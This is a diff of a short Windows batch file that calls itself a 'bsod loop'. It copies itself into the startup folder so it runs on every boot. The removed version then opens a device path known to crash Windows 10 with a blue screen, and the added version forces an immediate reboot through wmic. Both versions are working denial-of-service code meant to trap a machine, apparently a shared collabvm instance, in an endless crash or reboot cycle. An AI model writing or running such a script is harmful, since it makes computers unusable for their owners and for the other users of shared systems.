@@ -1,4 +1,3 @@
 @echo off
-copy "Windows 10 bsod loop (just for collabvm).bat" "shell:startup"
-exit
-\\.\globalroot\device\condrv\kernelconnect
+copy "Windows 10 bsod loop assist.bat" "shell:startup"
+wmic os where primary=1 reboot
